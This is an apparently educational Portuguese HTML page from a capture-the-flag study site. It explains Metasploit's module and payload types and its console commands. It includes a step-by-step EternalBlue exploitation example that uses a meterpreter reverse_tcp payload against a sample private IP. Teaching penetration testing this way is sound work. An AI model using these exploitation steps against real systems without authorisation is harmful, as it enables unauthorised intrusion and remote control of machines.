<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Metasploit - Framework de Exploração</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #115192 0%, #0a4b8f 100%);
            border-radius: 12px;
            color: white;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        
        h2 {
            color: #115192;
            margin: 35px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #115192;
        }
        
        h3 {
            color: #0a4b8f;
            margin: 15px 0 10px;
        }
        
        p {
            margin-bottom: 15px;
        }
        
        .intro {
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 40px;
            line-height: 1.8;
        }
        
        .cards-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .card {
            background: linear-gradient(145deg, #ffffff, #f5f9ff);
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 25px;
            transition: all 0.3s ease;
            border-top: 5px solid #115192;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #115192, #0a4b8f);
        }
        
        .card:hover {
            transform: translateY(-8px);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .card-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #115192, #0a4b8f);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 1.5rem;
        }
        
        .card h3 {
            color: #115192;
            margin: 0;
            font-size: 1.4rem;
        }
        
        .card-content {
            color: #444;
            line-height: 1.6;
        }
        
        .highlight {
            background-color: #e8f4ff;
            padding: 12px 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 4px solid #115192;
            font-size: 0.95rem;
        }
        
        .highlight code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
        
        .section {
            background: linear-gradient(to right, #e8f4ff, #f0f8ff);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin: 40px 0;
            border-left: 5px solid #115192;
        }
        
        .code {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 18px;
            border-radius: 8px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            border-left: 4px solid #115192;
        }
        
        .command {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 12px 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            display: flex;
            align-items: center;
        }
        
        .command-prefix {
            color: #50fa7b;
            margin-right: 10px;
        }
        
        .example-link {
            display: inline-block;
            background: #115192;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            margin: 10px 0;
            transition: background 0.3s;
        }
        
        .example-link:hover {
            background: #0a4b8f;
        }
        
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 25px;
            color: #666;
            font-size: 0.95rem;
            border-top: 1px solid #ddd;
        }
        
        ul, ol {
            margin-left: 20px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 8px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #e8f4ff;
            color: #115192;
        }
        
        tr:hover {
            background-color: #f5f9ff;
        }
        
        @media (max-width: 768px) {
            .cards-container {
                grid-template-columns: 1fr;
            }
            
            header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.2rem;
            }
            
            table {
                display: block;
                overflow-x: auto;
            }
        }
    </style>
</head>
<body>
    <a href="../CTF.php"><?php include('../seta.php'); ?></a>
    <div class="container">
        <header>
            <h1>METASPLOIT</h1>
            <p class="subtitle">Framework de exploração de vulnerabilidades</p>
        </header>
        
        <section class="intro">
            <h2>O que é o Metasploit?</h2>
            <p>O Metasploit é um framework de segurança de código aberto que facilita o teste de penetração e desenvolvimento de exploits. Ele fornece uma plataforma completa para descobrir, explorar e validar vulnerabilidades em sistemas.</p>
        </section>
        
        <h2>Componentes do Metasploit</h2>
        <div class="cards-container">
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">
                        <i class="fas fa-bomb"></i>
                    </div>
                    <h3>Exploits</h3>
                </div>
                <div class="card-content">
                    <p>Códigos que exploram vulnerabilidades específicas em sistemas ou aplicações. Cada exploit é projetado para atingir uma vulnerabilidade particular.</p>
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">
                        <i class="fas fa-code"></i>
                    </div>
                    <h3>Payloads</h3>
                </div>
                <div class="card-content">
                    <p>Códigos executados após uma exploração bem-sucedida. Podem fornecer acesso remoto, executar comandos ou criar backdoors.</p>
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">
                        <i class="fas fa-wrench"></i>
                    </div>
                    <h3>Auxiliary</h3>
                </div>
                <div class="card-content">
                    <p>Módulos que realizam tarefas auxiliares como scanning, fuzzing, brute force e coleta de informações sem explorar vulnerabilidades diretamente.</p>
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">
                        <i class="fas fa-puzzle-piece"></i>
                    </div>
                    <h3>Encoders</h3>
                </div>
                <div class="card-content">
                    <p>Ferramentas que modificam payloads para evitar detecção por antivírus e sistemas de prevenção de intrusão.</p>
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">
                        <i class="fas fa-cogs"></i>
                    </div>
                    <h3>Post-Exploitation</h3>
                </div>
                <div class="card-content">
                    <p>Módulos usados após acesso bem-sucedido a um sistema para coletar informações, escalar privilégios ou mover-se lateralmente na rede.</p>
                </div>
            </div>
        </div>
        
        <section class="section">
            <h2>Comandos Principais do Metasploit</h2>
            
            <div class="command">
                <span class="command-prefix">msf6></span> history
            </div>
            <p>Mostra o histórico de comandos utilizados.</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> search CVE-2025-3248
            </div>
            <p>Pesquisa exploits por CVE (ex: CVE-2025-3248).</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> searchsploit fuelcms 1.4
            </div>
            <p>Pesquisa pelo nome e/ou versão da aplicação (ex: searchsploit fuelcms 1.4).</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> search type:auxiliary telnet
            </div>
            <p>Pesquisa usando palavras-chave como tipo e plataforma (ex: search type:auxiliary telnet).</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> use 0
            </div>
            <div class="command">
                <span class="command-prefix">msf6></span> use exploit/windows/smb/ms17_010_eternalblue
            </div>
            <p>Seleciona o exploit que vai usar (por número ou caminho completo).</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> set LHOST 192.168.1.10
            </div>
            <p>Define seu endereço IP (local host).</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> set RHOSTS 192.168.1.100
            </div>
            <p>Define o IP da máquina alvo (remote host).</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> set RPORT 445
            </div>
            <p>Define a porta utilizada para a conexão.</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> set HttpPassword admin123
            </div>
            <p>Define a senha para autenticação HTTP.</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> set HttpUsername admin
            </div>
            <p>Define o usuário para autenticação HTTP.</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> show options
            </div>
            <p>Mostra as opções configuradas para o módulo atual.</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> run
            </div>
            <div class="command">
                <span class="command-prefix">msf6></span> exploit
            </div>
            <p>Inicia a execução do exploit.</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> show payloads
            </div>
            <p>Mostra os payloads disponíveis para o exploit atual.</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> back
            </div>
            <p>Sai do exploit/payload selecionado e retorna ao menu principal.</p>
            
            <div class="command">
                <span class="command-prefix">msf6></span> info
            </div>
            <p>Mostra informações detalhadas sobre o exploit/payload selecionado.</p>
        </section>
        
        <section class="section">
            <h2>Exemplo de Uso do Metasploit</h2>
            
            <p>Veja um exemplo completo de como explorar uma vulnerabilidade:</p>
            
            <div class="code">
                # Iniciar o Metasploit
                msfconsole
                
                # Procurar por exploits relacionados a EternalBlue
                msf6> search eternalblue
                
                # Selecionar o exploit
                msf6> use exploit/windows/smb/ms17_010_eternalblue
                
                # Configurar opções
                msf6> set RHOSTS 192.168.1.100
                msf6> set LHOST 192.168.1.10
                
                # Verificar opções configuradas
                msf6> show options
                
                # Selecionar payload
                msf6> set payload windows/x64/meterpreter/reverse_tcp
                
                # Executar o exploit
                msf6> exploit
                
                # Após acesso bem-sucedido, usar comandos do Meterpreter
                meterpreter> sysinfo
                meterpreter> getuid
            </div>
        </section>
        
        <section class="section">
            <h2>Comandos Adicionais Úteis</h2>
            
            <table>
                <tr>
                    <th>Comando</th>
                    <th>Descrição</th>
                </tr>
                <tr>
                    <td><code>sessions -l</code></td>
                    <td>Lista todas as sessões ativas</td>
                </tr>
                <tr>
                    <td><code>sessions -i [id]</code></td>
                    <td>Interage com uma sessão específica</td>
                </tr>
                <tr>
                    <td><code>setg</code></td>
                    <td>Define uma opção globalmente (para todos os módulos)</td>
                </tr>
                <tr>
                    <td><code>unsetg</code></td>
                    <td>Remove uma opção global</td>
                </tr>
                <tr>
                    <td><code>save</code></td>
                    <td>Salva as configurações atuais</td>
                </tr>
                <tr>
                    <td><code>check</code></td>
                    <td>Verifica se o alvo é vulnerável sem explorar</td>
                </tr>
                <tr>
                    <td><code>reload</code></td>
                    <td>Recarrega o módulo atual</td>
                </tr>
                <tr>
                    <td><code>version</code></td>
                    <td>Mostra a versão do Metasploit</td>
                </tr>
            </table>
        </section>
        
        <section class="section">
            <h2>Tipos de Payloads</h2>
            
            <div class="cards-container">
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-terminal"></i>
                        </div>
                        <h3>Singles</h3>
                    </div>
                    <div class="card-content">
                        <p>Payloads autônomos que não precisam do Metasploit para funcionar após a entrega.</p>
                        <div class="highlight">
                            Exemplo: <code>windows/shell_bind_tcp</code>
                        </div>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-network-wired"></i>
                        </div>
                        <h3>Stagers</h3>
                    </div>
                    <div class="card-content">
                        <p>Payloads pequenos que estabelecem uma conexão com o atacante e carregam um stage maior.</p>
                        <div class="highlight">
                            Exemplo: <code>windows/meterpreter/reverse_tcp</code>
                        </div>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-box-open"></i>
                        </div>
                        <h3>Stages</h3>
                    </div>
                    <div class="card-content">
                        <p>Payloads maiores carregados pelos stagers que fornecem funcionalidades avançadas.</p>
                        <div class="highlight">
                            Exemplo: <code>meterpreter</code>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        
        <footer>
            <p>Material educativo para testes de penetração e segurança ofensiva | Metasploit Framework</p>
        </footer>
    </div>
</body>
</html>